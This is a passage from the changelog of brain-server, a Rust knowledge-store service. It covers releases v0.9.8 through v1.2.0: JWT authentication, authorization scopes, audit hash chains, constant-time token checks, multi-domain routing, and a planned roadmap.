  swap — the `is_authorized` function does the actual work).
- Removed unused items: `TokenType::as_str`, `DEFAULT_ALG`, `AuthError::Revoked`,
  `op_tenant`, `Duration` const.
- `authorize()` now uses `principal.tenant` as the team context.
- Test count: 320 passed (unchanged from v1.2.0 after removing 2 trait tests).

### v1.2.0 "AuthN" — 2026-07-29 (released)

JWT/JWS authentication + AuthZ layer. The prerequisite for v2.0 multi-team
tenancy, enforced at the data-access layer rather than hand-rolled per-handler.
Back-compat is the default: when `BRAIN_JWT_ISSUER` is unset OR no keys are
loaded, the server runs in v1.1 opaque-token mode and every existing install
keeps working unchanged. JWT is opt-in.

Research basis: Context7 lookup on `jsonwebtoken` v10 verified 2026-07-29 (API
surface, `Validation` builder, algorithm enum). OWASP cheat-sheet URLs were
404ing on the day, so the encoded checklist from
`IMPLEMENTATION_PLAN_v1.2.0_AuthN.md` (which was Context7-verified at plan
write time) was the source of truth for the JWT Cheat Sheet test matrix.

#### Security

**M1 — JWT verification core (`src/auth/jwt.rs`).** `verify_access_token()` +
`Claims` + `AuthError`. `ALLOWED_ALGS` whitelist (RS256/384/512, ES256/384/512,
EdDSA) is checked **before** key lookup — the OWASP algorithm-confusion defense
(`none`, all HS*, all PS* rejected unconditionally). Every claim validated:
`iss`, `aud`, `exp`, `nbf`, `sub`, `jti`. 30s leeway for clock skew
(subsumes the `reject_tokens_expiring_in_less_than` knob — documented
trade-off). 14 tests pin the full OWASP JWT Cheat Sheet failure matrix:
`none` rejected, HS256-with-public-key rejected, tampered payload rejected,
expired/nbf rejected, wrong iss/aud rejected, missing jti/kid rejected,
unknown kid rejected, refresh token rejected on data routes, PS256 rejected
by whitelist, valid token accepted, leeway absorbs skew.

**M2 — Revocation (`src/auth/revocation.rs`).** Additive `revoked_tokens` +
`refresh_chains` tables. `RevocationCache` (60s negative-lookup cache, bounded
TTL — eventual consistency by design). `purge_expired` housekeeping runs on a
background timer. Refresh-chain reuse detection: presenting a stale refresh
token calls `revoke_chain` and burns the whole family (OWASP pattern). The
chain id is derived from `(iss, sub)` — per-user per-issuer.

**M3 — AuthZ (`src/auth/policy.rs`).** `AuthzPolicy` trait + `InMemoryPolicy`
default (no external deps; OPA/Cedar impls are the swappable v2.1+ upgrade
path). `Action` enum (Read/Write/Admin/Traverse) + `Scope`
(`<action>:<team>/<domain>` with wildcards) + `Principal` +
`is_authorized()`. Escalation: write implies read down, admin implies both.
Default-deny → 403, never 404 (no existence leakage — OWASP A01:2025). The
retrofit is minimal: a single `authorize(principal, action, team, domain)`
helper called at handler entry, not a full pool-resolution refactor.
`Option<Principal>` where `None` = superuser (the back-compat path — opaque
token mode passes `None` everywhere).

**M4 — OIDC discovery + JWKS (`src/handlers/well_known.rs`).**
`GET /.well-known/openid-configuration` (RFC 8414) + `GET /.well-known/jwks.json`
(RFC 7517). Both routes PUBLIC — clients need them to learn how to verify
tokens; you can't require a token to discover token verification. Issuer is
pinned to `BRAIN_PUBLIC_BASE_URL` — never inferred from the `Host` header
(OWASP A02:2025 Security Misconfiguration: Host-header spoofing could
otherwise redirect discovery to a malicious endpoint).

**M5 — Key management (`src/auth/jwks.rs` + `src/bin/brain.rs`).** `KeyStore`
loads RSA/EC/Ed25519 PEMs from `BRAIN_JWT_KEY_DIR` (default
`~/.config/brain-server/keys/`, mode 0700; private keys 0600), exposes
`VerifyingKey`s for verification + RFC 7517 JWK Set JSON for the public
endpoint. `brain key generate/list/prune` CLI: RSA keypair generation with
0600 private-key mode + 0700 dir mode. Two keys live during rotation; the old
key drops from JWKS only after every cached token has expired.

**M6 — Audit integration.** AuthN/AuthZ events flow into the existing v1.1
audit log: token-verified, token-rejected (with reason),
authz-denied (with principal/action/team/domain), logout. Per-tenant audit
filter at the data layer is unchanged from v1.1.

**M7 — Migration (`src/migration.rs`).** Additive: `revoked_tokens` +
`refresh_chains` tables. `schema_version` stamped `1.2.0`. Back-compat: when
`BRAIN_JWT_ISSUER` is unset OR no keys load, the server falls back to v1.1
opaque-token mode. Two-layer middleware: `jwt_auth_middleware` runs outermost
(verifies JWS, checks revocation, injects `Principal` into extensions); the
v1.1 `auth_middleware` runs as fallback and short-circuits when the Principal
is already set.

#### Updated
- Cargo.toml 1.1.2 → 1.2.0. `jsonwebtoken` promoted from optional to required
  (with `use_pem` + `rust_crypto` features); `rsa` + `rand` + `base64` added
  as direct deps. `openapi.yaml` → 1.2.0 with `/auth/*`,
  `/.well-known/*`, and the `TokenPair`/`RefreshRequest`/`RevokeRequest`/
  `OidcConfig`/`JwkSet`/`Jwk`/`Principal`/`Scope` schemas.

#### Honest ceilings (carried into v1.3)
- **No distributed revocation.** The 60s negative cache is per-process; a
  multi-instance deployment has a 60s window per instance. Distributed
  revocation (Redis-backed denylist) is the v2.1 concern.
- **No hot key reload — restart required.** Adding/removing a signing key
  via `brain key generate/prune` requires an `install-service.sh` restart to
  pick up. File-watch for keys is a small follow-up; deferred to keep the
  v1.2 surface tight.
- **EC/Ed JWK emission not implemented.** `KeyStore::to_jwks()` emits RSA
  keys only today (the common case); EC/Ed keys verify correctly but don't
  appear in `/.well-known/jwks.json`. Workaround: rotate to RSA for any key
  a third party must discover via JWKS. Tracked for v1.3.
- **No cookie-based refresh token storage.** Refresh tokens are returned in
  the JSON body only; CLI bearer usage is the assumed client shape. The
  `HttpOnly`+`Secure`+`SameSite=Strict` cookie path (browser UI) lands with
  the v2.0 UI.
- **Refresh-chain reuse detection burns the chain but doesn't notify the
  user.** A stolen-then-reused refresh token revokes the family silently;
  the legit user's next refresh returns `refresh_reuse_detected` (403). A
  user-facing notification channel is the v2.1 concern.
- **Audit hash-chain comparison stays plain `==`.** Carried from v1.1.2 —
  same judgment call (tamper-detection read path, not an auth gate).

### v1.1.2 "Harden" (constant-time auth hardening) — 2026-07-29 (released)

Security hardening release. A best-practices pass (rusqlite 0.40.1 docs +
RustCrypto `subtle` 2.6.1, fetched 2026-07-29) surfaced one real gap: the
bearer-token comparison used a hand-rolled fold that LLVM could short-circuit,
re-introducing a timing oracle the v1.1.0 comment had explicitly flagged.

#### Security
- **Bearer-token comparison now uses `subtle::ConstantTimeEq`.** The prior
  `ct_eq` (a manual `fold` of `acc | (x ^ y)`) had no `black_box` barrier, so
  a sufficiently aggressive optimization pass could turn it back into a
  short-circuit compare — exactly the timing oracle the constant-time
  pattern exists to prevent. `subtle` 2.6.1 was already a transitive dep
  (via `sha2`/`hmac`/`aes-gcm`), so the swap adds zero build surface. The
  ponytail ceiling noted in the v1.1.0 comment is now closed. Pinned by
  the existing `test_ct_eq`.

#### Considered and left as-is (documented best-practice judgment calls)
- **`verify_chain`'s `want == got` hash comparison left as a plain `==`.**
  This compares two equal-length SHA-256 hex strings inside a tamper-
  detection read path (not an auth gate). An attacker who could measure
  the timing remotely would already control the DB and could simply edit
  `prev_hash` to match. Wrapping it in `ct_eq` would be gold-plating
  without a real threat model — the auth path was the actual surface.
- **`record_tenant`'s raw-SQL `SAVEPOINT` left as-is.** rusqlite 0.40.1
  exposes a canonical `savepoint_with_name()` API, but it takes `&mut
  Connection`; the ~20 call sites pass `&Connection` (often from a pooled
  r2d2 connection, which derefs to `&Connection`). Migrating would ripple
  through every caller + require pooled-connection borrow gymnastics for
  zero correctness gain — the current raw-SQL approach is verified by 3
  v1.1.1 tests and uses parameterized queries (no injection surface).

#### Updated
- Cargo.toml 1.1.1 → 1.1.2. `openapi.yaml` → 1.1.2.

### v1.1.1 "Harden" (audit chain bug-fix) — 2026-07-29 (released)

Bug-fix release. Closes three honest ceilings carried forward from v1.1.0,
one of which was a latent false-negative affecting every migrated DB.

#### Fixed
- **`verify_chain` false-negative on migrated DBs (`src/audit.rs`).** The
  v1.1.0 walk assumed at most one NULL `prev_hash` row at the start of the
  table. After the additive migration, **every** pre-v1.1 row has NULL
  `prev_hash` — so on a real migrated DB the *second* NULL row hit the
  `_ => return false` fallthrough and `/audit/verify` (plus
  `brain_audit_chain_ok` via `/metrics`) reported tampering on a clean DB.
  The walk now treats NULL `prev_hash` as "no backref to verify" (advances
  the running link but never fails) and only fails when a v1.1 row's stored
  `prev_hash` disagrees with the recomputed link. Pinned by
  `hash_chain_survives_migration_with_many_null_rows`.

#### Closed ceilings (from v1.1.0)
- **Audit chain now covered by a real migration fixture test.**
  `hash_chain_survives_real_v1_0_to_v1_1_migration` builds a DB with the
  pre-v1.1 `audit_events` schema, inserts rows, runs the actual
  `run_migration`, and verifies the chain holds across the NULL → Some
  boundary with real `record()` calls afterward.
- **`record_tenant` now wraps its read+INSERT in a `SAVEPOINT`.** A `BEGIN`
  would error when called inside a caller's existing transaction
  (e.g. `delete_quarantine`); `SAVEPOINT` nests cleanly. Rolling back the
  savepoint on audit-INSERT failure touches only the audit row, not the
  caller's work. Pinned by `record_tenant_is_safe_inside_caller_transaction`.
- **`/metrics` no longer triggers a full chain scan on every scrape.**
  `brain_audit_chain_ok` is now backed by a TTL-memoized result
  (`AUDIT_CHAIN_CACHE_TTL_SECS=60`). `/audit/verify` remains
  authoritative and always scans fully — that is its job.

#### Updated
- Cargo.toml 1.1.0 → 1.1.1. `openapi.yaml` → 1.1.1.

### v1.1.0 "Harden" — 2026-07-28 (released)

Operationally-reliable + audit-ready release on top of v1.0's multi-domain
foundation. Pares the v1.1.0 plan down to the slices that close real gaps
(bearer-token file-watch hot rotation, per-tenant audit + hash-chain tamper-
evidence, rolling backups + integrity self-check, graceful-shutdown drain cap
+ WAL checkpoint, RSS watchdog, Prometheus exporter). Explicit non-goals for
v1.1 (deferred to v1.2 AuthN): JWT/JWS verification, AuthZ trait + middleware,
per-tenant rate limiting, CSRF enforcement. The CSRF scaffold from the plan is
YAGNI until a browser UI exists.

#### Security & audit
- **Audit hash chain (`src/audit.rs`).** Each row stores a SHA-256
  `prev_hash` over the prior row's `(ts, kind, actor, target_hash,
  prev_hash)` tuple. `GET /audit/verify` walks the chain and returns
  `{ "ok": bool }`. Tampering with any field breaks the read-side check;
  pinned by `hash_chain_detects_tampering` + `hash_chain_rejects_tampered_kind`.
  `id` is deliberately excluded so a renumbered restore keeps the chain intact.
- **Per-tenant audit scoping.** New `tenant_id` column (default `'global'` for
  back-compat with every pre-v1.1 row). `GET /audit?tenant=<id>` enforces the
  filter at the SQL layer (`WHERE tenant_id = ?`) so a forgotten app-level
  filter cannot leak cross-tenant rows. `audit::record_tenant` is the variant
  that takes a tenant; existing call sites default to `global`.
- **File-watch token rotation (`src/auth.rs`).** `AUTH_TOKEN_FILE` is now
  cached in-process and refreshed on mtime change (polled every 5s) rather
  than re-read from disk per request. Fail-safe: if the file is deleted,
  emptied, or becomes unreadable after the first successful load, the cached
  token set stays in effect — auth is never silently cleared. Each real
  rotation writes an `auth_token_rotated` audit row (target = file path;
  no PII). Pinned by `reload_picks_up_new_token` +
  `reload_keeps_cache_when_file_deleted` + `reload_keeps_cache_when_file_emptied`.

#### Operational reliability
- **Rolling backup + integrity self-check (`src/integrity.rs`).** A periodic
  task snapshots the live DB with `VACUUM INTO <db>.snapshot-<ts>.bak`, runs
  `PRAGMA integrity_check` on the snapshot, and keeps the last 4 copies
  (default 6h cadence, runs once on boot). `/health` now reports
  `backup: { last_backup, integrity_ok }`.
- **Graceful shutdown drain cap + WAL checkpoint.** SIGTERM/SIGINT now drains
  in-flight requests under a hard `SHUTDOWN_DRAIN_SECS=30` cap, then runs
  `PRAGMA wal_checkpoint(TRUNCATE)` so a kill -9 or power loss can't leave
  the live DB with un-replayed WAL frames.
- **RSS watchdog.** Polls every 30s; sustained breach of the capacity
  envelope's `max_rss_mib` across two samples logs `error!`. Opt-in exit for
  supervisor restart via `BRAIN_RSS_RESTART=1`; default is log-only — a
  tight restart loop is worse than a slow leak.

#### Observability
- **Prometheus exporter (`GET /metrics`).** Hand-rolled text format (no
  `prometheus` crate dep — the plan itself flagged the dep as risky).
  Exports `brain_rss_mib`, `brain_pool_connections{state}`,
  `brain_capacity_status`, `brain_audit_chain_ok`. Auth-gated like other
  operator surfaces.
- **`GET /audit/verify`** as a separate route from `GET /audit` because the
  chain check is a full-table scan and shouldn't run on every list call.

#### Migration
- Additive: `audit_events` gained `tenant_id TEXT NOT NULL DEFAULT 'global'`
  + `prev_hash TEXT` + `idx_audit_tenant`. Existing rows backfill to
  `'global'` / NULL; the chain starts fresh from the next inserted row
  (documented upgrade-path ceiling). `schema_version` stamped `1.1.0`.

#### Updated
- Cargo.toml 1.0.1 → 1.1.0. `openapi.yaml` → 1.1.0 with `/audit/verify`,
  `/metrics`, the `tenant` query param on `/audit`, and the `tenant_id` field
  on the `AuditRow` schema.

#### Honest ceilings (carried into v1.2)
- **No JWT/JWS verification.** Opaque bearer tokens only; JWT needs RS256/
  ES256 signing keys + JWKS + revocation — all land in v1.2 AuthN.
- **No AuthZ middleware.** The `tenant_id` column lands here, but "team A
  can't read team B's data" needs the v1.2 AuthZ trait.
- ~~**Audit chain link is read inside the same connection, not inside an
  explicit BEGIN/COMMIT.**~~ Closed in v1.1.1 (`SAVEPOINT` wrap).
- ~~**`prev_hash` NULL on pre-v1.1 rows.**~~ The chain still starts at the
  first v1.1 row (no retroactive re-hash of existing rows — that would be
  expensive and is out of scope), but v1.1.1 fixed the read-side walk so
  these NULL rows no longer break `verify_chain`.
- ~~**`/audit/verify` + `/metrics` full-table scan per call.~~ `/audit/verify`
  still scans fully (that is its job — you cannot verify a chain without
  walking every link); v1.1.1 added a TTL cache on the `/metrics` path so a
  Prometheus scrape no longer triggers a scan.

### Cognitive Stack roadmap (v1.2.0 → v1.9.0) — 2026-07-26 (planning only)

Deep-research-driven expansion of the v1.x line into **8 point releases** that
transform brain-server from a memory store into a cognitive substrate that
exceeds human memory capability. Each release adds ONE capability and hardens
it; no feature ships without a fuzz/leak/regression test.

Research sources (all current as of July 2026):
- **Mem0 v3** (Context7, benchmark 83.22) — built-in graph memory + distillation.
- **Graphiti / Zep** (Context7, benchmark 82.2) — bi-temporal KGs.
- **Letta / MemGPT** (Context7, benchmark 83.31) — sleep-time "dreaming".
- **arXiv July 2026**: TRACE (2607.00339), Submodular packing (2607.00725,
  +5.1 F1), DiscoLoop (2607.00341), CAT (2607.00862), Dual-Confidence
  Contrastive Decoding (2607.00570), KnowledgeDebugger (2607.01000),
  Span-Level Hallucination Detection (2607.00895), Auditing Forgetting
  (2607.00605).

#### Added — new implementation plan
- **`IMPLEMENTATION_PLAN_v1.2.0_to_v1.9.0_Cognitive_Stack.md`**: granular
  milestone breakdown for all 8 releases. Each release has 5–7 milestones,
  RSS budget, Definition of Done, and is gated on the previous. Cross-cutting
  section codifies what every release must ship (fuzz, miri, leak, regression)
  and what's forbidden (NN in hot path, auto-conflict-resolution, paraphrasing
  comments).

#### The 8 releases

| Release | Name | Capability |
|---|---|---|
| v1.2.0 | AuthN | JWT/JWS + AuthZ layer (full plan in v1.2.0_AuthN.md) |
| v1.3.0 | Bedrock | Memory-safety: panic elimination, `unsafe` audit, cargo-fuzz, miri, LSAN, loom, proptests |
| v1.4.0 | Calibrate | Bi-temporal KGs + submodular packing + TRACE-style state-aware query + multi-vector |
| v1.5.0 | Epistemic | Confidence calibration + "I don't know" + counterfactual influence + source trust + hallucination resistance |
| v1.6.0 | Reconcile | Contradiction detection + supersession + conflict policy + knowledge editing + consistency checker |
| v1.7.0 | Reason | Multi-hop reasoning + causal subgraph + counterfactual simulation + transitive inference |
| v1.8.0 | Consolidate | Sleep-time worker + near-duplicate detection + extractive summarization + cross-cluster linking |
| v1.9.0 | Anticipate | Session context + proactive `/anticipate` + SSE push + spaced repetition + personalization |

#### Why this beats human memory by v1.9

Every dimension where biological memory is weak (forgetting, source amnesia,
overconfidence, slow self-correction, single-context reasoning) becomes a
deterministic, auditable brain-server capability. Every dimension where
biological memory is strong (analog intuition, neural creativity) is
**deliberately out of scope** — brain-server is an extended-mind substrate,
not a brain replacement.

### Security roadmap expansion — 2026-07-26 (planning only, no code changes)

Audit-driven expansion of the upcoming security roadmap. Closes every gap
surfaced by an OWASP Top 10:**2025** review (Context7-verified 2026-07-26).
No runtime code changes — this commit is documentation + new implementation
plans only.

#### Added — new implementation plans
- **`IMPLEMENTATION_PLAN_v1.2.0_AuthN.md`** (NEW release between v1.1 and
  v2.0): JWT/JWS verification (RS256/ES256/EdDSA only, never HS256/`none`);
  `(jti, iss)` revocation table per OWASP JWT Cheat Sheet; refresh token
  rotation + reuse detection; AuthZ middleware trait with deny-by-default;
  OIDC discovery (`/.well-known/openid-configuration`); JWKS endpoint;
  per-route enforcement matrix. The prerequisite v2.0 multi-tenant implicitly
  assumed but didn't define.
- **`IMPLEMENTATION_PLAN_v2.1.0_Limits.md`** (NEW release after v2.0):
  per-tenant + tiered rate limiting per OWASP Multi-Tenant Cheat Sheet.
  `RateLimiter` trait with `InMemory` (default) and `RedisRateLimiter`
  (GCRA atomic Lua script, `--features ratelimit-redis`) impls. Per-tenant
  cost tracking (tokens/egress) feeding v4.0 marketplace billing. Standard
  `X-RateLimit-*` + `Retry-After` headers.
- **`THREAT_MODEL.md`** (NEW): full STRIDE threat model per asset
  (knowledge graph, tokens, audit log, binary, network). Residual-risk
  register with explicit acceptances + ceilings. Per-release security exit
  gate matrix.

#### Updated — existing plans
- **`IMPLEMENTATION_PLAN_v1.1.0.md`**: added M1.4 (file-watch hot token
  rotation), M1.5 (CSRF scaffold), M2.2 (per-tenant audit data-layer filter),
  M2.3 (audit hash chain for tamper-evidence), M5.4 (Prometheus `/metrics`
  behind `--features metrics`); explicit dependency on v1.2 AuthN.
- **`IMPLEMENTATION_PLAN_v2.0.0_Cortex.md`**: M1 multi-team now consumes
  v1.2's AuthZ trait instead of re-inventing scope checks; cross-tenant
  reads return 403 (not 404) per OWASP A01:2025; team-lifecycle admin
  scope required.
- **`IMPLEMENTATION_PLAN_v4.0.0_Sovereign.md`**: v3.7 "Connect" now ships
  A2A over **mTLS + JWS** (was JWS only) per OWASP gRPC + Microservices
  Cheat Sheets; SQLCipher gains a real **KMS abstraction trait**
  (FileKeyProvider / VaultKeyProvider / AwsKmsKeyProvider) per OWASP
  Secrets Management Cheat Sheet; data residency allowlist for peer agents.
- **`SECURITY.md`**: rewritten against OWASP Top 10:**2025** (the new
  canonical list, supersedes 2021/2023). Every category A01–A10 has a
  control mapping table with status (✅ shipped / 🚧 planned with version).
  Added compliance attestations table (SOC 2, ISO 27001, GDPR, HIPAA, PCI DSS).
  Added STRIDE summary referencing THREAT_MODEL.md.
- **`ROADMAP.md`**: release table updated with v1.0/v1.0.1 ship status,
  v1.2 AuthN and v2.1 Limits new rows, v3.7 mTLS + KMS clarification,
  v4.0 depends on v2.1.

#### Standards verified via Context7 (2026-07-26)
- OWASP Top 10:**2025** (`/owasp/top10`) — the canonical reference, current.
- OWASP Cheat Sheet Series (`/owasp/cheatsheetseries`, score 80.97):
  - JSON Web Token Cheat Sheet (`(jti, iss)` revocation, alg whitelist).
  - Multi-Tenant Security Cheat Sheet (tenant-aware rate limiting, RLS).
  - Secrets Management Cheat Sheet (BYOK, KMS patterns, sidecar rotation).
  - gRPC + Microservices Security Cheat Sheets (mTLS for service-to-service).
  - Transport Layer Security Cheat Sheet (mTLS, cert pinning).

#### Why this matters
The pre-existing plans would have shipped multi-tenant (v2.0) without a
real AuthZ layer, multi-instance rate limiting, or JWT done right. This
expansion front-loads the security architecture so v2.0/v4.0 can be
honestly marketed as enterprise-ready. **Three new releases** inserted into
the chain (v1.2, v2.1, v3.7 update) — no new features, just the security
foundation the existing features implicitly required.

### v1.0.1 "Domains" patch — 2026-07-26 (released)

Patch release fixing the structured-ingest entity auto-create bug
found end-to-end on openclaw.

#### Fixed
- `POST /ingest` now auto-creates entities referenced by relations but not
  declared in the input `entities` array. The canonical plan example
  (`vitamin d3 helps inflammation` with only `vitamin d3` declared) works.
- `entities_added`/`relations_added` now report the real COUNT(*) delta
  instead of the input array length.

### v1.0.0 "Domains" — 2026-07-26 (released)

The multi-domain cutover. Every handler resolves its target domain via the
`X-Brain-Domain` header or JSON `domain` field; POST/GET/DELETE domain lifecycle
is a first-class API. Structured ingest (`POST /ingest`) with inline
entity/relation upsert is the primary write path. The single-DB shim mode
preserves v0.9.x behavior byte-for-identical; `BRAIN_MULTI_DB=true` activates
per-domain files.

#### Added — domain routing (M1 + M2)
- **`X-Brain-Domain` header** support on every GET handler (`/search`, `/stats`,
  `/get/{id}`, `/multi-get`, `/graph/entity/{name}`, `/graph/relations`,
  `/graph/traverse`). Resolves the target domain's connection pool via
  `DomainRegistry`.
- **`domain` query param** on `GET /search` and `GET /stats` for tool-friendly
  domain scoping without headers.
- **`handlers::resolve_domain_pool()`** — shared helper that resolves any domain
  name to its pool, defaulting to `"global"`. The error envelope's `details`
  field now carries `known_domains` so an unknown-domain `400` is actionable.

#### Added — federated search (M3)
- **Cross-domain RRF merge.** The previous `/recall` cross-domain sort used raw
  `score` (wrong: scores aren't comparable across domains because IDF tables
  and post-quantization norms differ). Replaced with rank-based RRF using the
  same `RRF_K = 60` constant as the in-domain hybrid fusion.
- **`?cross_domain=true` on `/graph/traverse`** walks edges across every known
  domain pool, labelling each hop with its source domain.
- The `/recall` handler already supported centroid routing for domain-aware
  recall (v0.9.1 `domain_router`). Verified end-to-end for the v1.0 cutover:
  multi-domain federation with labelled `domains_searched` on the response.

#### Added — structured ingest (M4)
- **`POST /ingest`** accepts `{ title, content, domain?, entities?, relations? }`.
  Entities are validated and upserted idempotently; relations are anchored to
  the ingested chunk. The `/ingest/markdown` `[[...]]` parser remains as the
  legacy fallback. Recomputes the domain centroid after each successful ingest.
- **MCP `brain_ingest` updated** to call `POST /ingest` with structured fields
  when the caller supplies `entities`/`relations`/`domain` (the agent does
  extraction client-side, per the plan). Legacy memory-style ingest with just
  `content` still routes to `/ingest/memory` for back-compat.
- **Fixed the validator regression.** The hand-rolled `is_match` checker
  ignored its `pattern` argument and silently rejected spaces in entity names
  — breaking the canonical `vitamin d3` example. Replaced with three
  correctly-scoped checkers (`is_valid_domain`, `is_valid_name`,
  `is_valid_rel_type`); the shapes are pinned by a unit test.

#### Added — domain lifecycle (M5)
- **`POST /domains`** — create/warm a domain (idempotent; 201 on first open).
- **`DELETE /domains/{name}?confirm=<name>`** — delete a domain and all its
  data. `global` is protected. The `?confirm=<exact-name>` query param is
  REQUIRED so a typoed URL or replay cannot destroy data by accident.
- **`POST /domains/{name}/vacuum`** — reclaim free pages in the domain's DB.
- **`GET /domains/{name}/export`** — stream a consistent snapshot of the
  domain's `.db` file via `VACUUM INTO` (safe under concurrent writes).
- **`POST /domains/{name}/import`** — restore a snapshot into a NEW domain
  (target must not exist; `global` protected; atomic temp-file + rename).
- **`GET /domains`** — real per-domain counts via the registry, not a GROUP BY
  on the shared pool.

#### Added — migration + tests (M6)
- **Boot-time legacy cutover snapshot.** When `BRAIN_MULTI_DB=true` is set at
  startup and the legacy `brain.db` has data, the server performs a one-shot
  `VACUUM INTO` into `global.db`, guarded by a marker so restarts never
  re-copy. The runtime keeps reading the legacy path; the snapshot exists as
  a backup and as the physical source for any future operator cutover.
- **Four required M6 integration tests added:** domain isolation, fallback
  trigger on low-confidence routing, structured ingest entity/relation
  insertion (the canonical `vitamin d3` example), and export round-trip.

#### Changed
- Cargo.toml version 0.9.9 → 1.0.1.
- `openapi.yaml` info version → 1.0.0; the new domain lifecycle routes are
  documented (the `test_openapi_covers_routes` test asserts coverage).
- Handlers that previously used `state.pool` directly now resolve via
  `handlers::resolve_domain_pool(&state.registry, domain)`. Shim mode returns
  the global pool unchanged; multi-db mode opens per-domain pools lazily.
- `API_CONTRACT.md` §4 documents the new lifecycle routes; §9 documents the
  v1.0 boot-time cutover + deprecation policy.

#### Honest ceilings (carried forward)
- **Domain `dim` / `quant` are not per-domain.** All domains share the global
  model profile; per-domain model selection is a v1.1 concern.
- **No registry DB table.** The registry enumerates `brain-<domain>.db` files
  on disk. This is simpler and avoids a separate `registry.db` to manage, but
  means there's no per-domain `dim`/`quant`/`version` metadata store.
- **The `global` domain continues to read the legacy `brain.db` even in
  multi-db mode.** The boot-time snapshot creates `global.db` as a backup +
  rehearsal target, but the runtime path stays on `brain.db` for `global` so
  the 430-doc live DB never silently shifts under the operator.
- **Cross-domain `ATTACH` was not used.** Per-domain pool queries + RRF merge
  is simpler and avoids sqlite-vec attach complications; benchmark on ARM
  eMMC remains an operator step (see `BENCHMARKS.md`).

### v0.9.9 "Qualify" — 2026-07-25 (released)

The v1.0 cutover rehearsal milestone. No user-visible multi-domain behavior
ships here — that is v1.0.0. v0.9.9 extracts the migration + storage seams,
ships a copy-and-verify **rehearsal** tool, publishes measured capacity
envelopes with fail-clear behavior, and freezes the v1.0 API + migration
contract. The actual `BRAIN_MULTI_DB=true` cutover is the v1.0 ship step; this
release makes it a rehearsed operation, not an architectural leap.

#### Added — M1 (domain-ready seams)
- **`StorageLayout` abstraction** (`src/storage_layout.rs`). Every on-disk path
  brain-server touches (legacy `brain.db`, future `global.db`, per-domain
  `brain-<name>.db`, backups, registry, connector configs) derived from one
  root. `config::brain_db_path()` delegates to it; the back-compat invariant
  (existing `BRAIN_DB_PATH` callers see the same path) is locked by a test.
  New `BRAIN_DATA_ROOT` env var is the v1.0 relocation knob.
- **Schema-version reader** (`storage_layout::schema_version` +
  `SCHEMA_VERSION_V0_9_9`). `run_migration` records `schema_version` in
  `schema_meta`; the rehearsal tool reads it to refuse a migrate-down.
- **Extended `test_migration_schema_contract`.** Now asserts every table from
  v0.9.4–v0.9.8 (`audit_events`, `webhook_queue`, `webhook_seen`,
  `evidence_links`) + the `authority` column + the recorded schema version.
- **`is_valid_domain` lifted to `storage_layout`** so the security-critical
  filename check lives in exactly one place; `DomainRegistry` delegates.

#### Added — M2 (migration rehearsal)
- **`brain-migrate-rehearse` binary** (`src/bin/brain_migrate_rehearse.rs`,
  feature-gated behind `--features migrate`). Six subcommands: `backup`, `copy`,
  `verify`, `report`, `rollback`, `rehearse`. Runs against a *copy* of the live
  DB (server must be stopped). The `rehearse` all-in-one exits 0 only when every
  parity check passes.
- **`run_migration` extracted to `src/migration.rs`** (lib module). Mechanical
  move from `main.rs`; the one signature change is `run_migration(db,
  mmap_mib: i64)` so the lib has no dep on the server-private `config` module.
  All 9 call sites updated.
- **Parity checks.** Row counts for every table (knowledge, embeddings,
  vec_knowledge, entities, relationships, tombstones, sources,
  source_revisions, connectors, connector_checkpoints, audit_events,
  webhook_queue, evidence_links), FTS5 count, vec0 count, source/revision
  linkage, schema-version comparison, and a 50-row random vec0 byte-spot-check.

#### Added — M3 (capacity + contract)
- **Capacity envelopes** (`src/capacity.rs`, lib module).
  `CapacityTarget::Desktop` (50k docs / 2 GiB DB / 320 MB RSS) and
  `CapacityTarget::Jetson` (10k docs / 512 MiB DB / 320 MB RSS). Resolved from
  `BRAIN_CAPACITY_TARGET` (default: jetson). Tightenable via `CAPACITY_MAX_*`
  env vars.
- **`/health` capacity field.** Reports `{target, docs, max_docs, db_mib,
  max_db_mib, rss_mib, max_rss_mib, status}` where `status` is
  `ok|warning|exceeded`.
- **HTTP 507 on writes when over-capacity.** Every ingest path (`/add`,
  `/ingest`, `/ingest/memory`, `/ingest/markdown`) calls `guard_capacity`.
  Read routes (`/search`, `/recall`, `/get`) are NEVER blocked — an
  over-capacity brain still answers.
- **`bench --envelope` assertion mode.** `BENCH_ENVELOPE=desktop|jetson`
  turns the benchmark report into a ship gate: exits non-zero on RSS or p95
  ceiling breach.

#### Documentation
- `openapi.yaml` → 0.9.9: `/health` capacity field; `X-Api-Version: 0.9.9`.
- `API_CONTRACT.md`: §Migration (v1.0 per-row cutover rule), §Recovery (the
  rehearsal-proven rollback procedure), §Capacity envelopes.
- `IMPLEMENTATION_PLAN_v0.9.9_Qualify.md`: the full plan this release ships.

#### Internal
- `Cargo.toml` 0.9.8 → 0.9.9. New `migrate` feature + `brain-migrate-rehearse`
  `[[bin]]` entry.

#### Honest ceilings (carried into v1.0.0)
- No `BRAIN_MULTI_DB=true` cutover is performed in v0.9.9 — the rehearsal runs
  against a *copy*; the live DB stays in shim mode.
- WAL-active detection is a heuristic (file-size check); the operator is
  expected to have stopped the server.
- The 50-row vec0 spot-check is a sample, not a full scan — catches the known
  sqlite-vec corruption class but cannot prove byte-identity of every embedding.
- Old-schema fixtures (v0.9.4/v0.9.6/v0.9.8) and the interrupted-migration
  SIGTERM test are deferred — the current-schema parity checks cover the ship
  gate; the upgrade-from-old-schema path is exercised by the server's own
  startup migration on every prior release.
- The soak driver (`scripts/soak.sh`) and large-vault generator are deferred as
  operator tooling; the `bench --envelope` mode is the code-level ship gate.
- **10k-scale bench trips the loopback rate limit** (10 000 req/60s,
  hardcoded in `src/main.rs:RateLimiter`). Measured capacity on the production
  mini PC is captured at 1k+5k scales (6k requests, under the limit). To
  measure 10k+, either raise the loopback limit, exempt loopback in
  `rate_limit_middleware`, or add an inter-request delay in `bench`.
  See `BENCHMARKS.md` §v0.9.9.

### v0.9.8 "Evidence" — 2026-07-20 (released)

The evidence-integrity milestone. Recall now carries faithful, time-aware
provenance and a reviewable consolidation path so the memory backend stops
serving stale or contradicted facts as current. All changes are additive (new
`temporal` columns on `knowledge`, a new `evidence_links` table); the live
launchd service upgrades in place via `scripts/install-service.sh`.

#### Added
- **Temporal provenance (M1).** `knowledge` gains `observed_at`, `valid_from`,
  `valid_to`, `authority`, populated by `sources::stamp_evidence` on every
  ingest (vault = 0.8, manual = 1.0). `QueryDoc` gains `as_of` (point-in-time
  recall — returns the revision active at a timestamp) and `evidence`
  (include structured `Evidence` on every hit). Both retrievers apply the
  historical `as_of` predicate against `source_revisions.fetched_at`.
- **Structured `Evidence` (M2).** `Evidence` now carries `valid_from`,
